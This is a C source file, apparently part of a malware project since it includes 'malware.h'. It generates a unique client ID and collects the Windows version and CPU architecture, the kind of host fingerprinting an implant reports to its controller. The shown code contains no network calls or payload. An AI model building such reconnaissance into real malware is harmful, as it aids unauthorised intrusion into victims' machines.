#include "malware.h"
#include <wincrypt.h>  // Windows Crypto API

// Generate unique client identifier
void GenerateClientID() {
    HCRYPTPROV hProv;      // Crypto provider handle
    BYTE randomBytes[16];  // Buffer for random bytes
    
    // Acquire crypto context
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        // Generate 16 random bytes
        if (CryptGenRandom(hProv, sizeof(randomBytes), randomBytes)) {
            // Convert to hex string (32 characters)
            for (int i = 0; i < sizeof(randomBytes); i++) {
                sprintf(CLIENT_ID + i*2, "%02X", randomBytes[i]);
            }
        }
        // Release crypto context
        CryptReleaseContext(hProv, 0);
    }
    
    // Fallback if crypto API fails
    if (strlen(CLIENT_ID) == 0) {
        DWORD volumeSerial;  // Volume serial number
        // Get C: drive serial number
        GetVolumeInformationA("C:\\", NULL, 0, &volumeSerial, NULL, NULL, NULL, 0);
        // Format as CLIENT-<hex serial>
        sprintf(CLIENT_ID, "CLIENT-%08X", volumeSerial);
    }

    printf("Generated Client ID: %s\n", CLIENT_ID);
}

// Get operating system information
void GetOSInfo(char* os, size_t len) {
    OSVERSIONINFOEX info;
    ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
    info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    
    // Get version information
    if (GetVersionEx((OSVERSIONINFO*)&info)) {
        // Format as "Windows major.minor"
        snprintf(os, len, "Windows %d.%d", 
                info.dwMajorVersion, 
                info.dwMinorVersion);
    } else {
        // Fallback to generic name
        strncpy(os, "Windows", len);
    }
    printf("OS Info: %s\n", os);
}

// Get processor architecture information
void GetArchInfo(char* arch, size_t len) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);  // Get system information
    
    // Map architecture ID to string
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            strncpy(arch, "x64", len);  // 64-bit AMD/Intel
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            strncpy(arch, "x86", len);  // 32-bit x86
            break;
        default:
            strncpy(arch, "Unknown", len);  // Other architectures
    }
    printf("Architecture: %s\n", arch);
}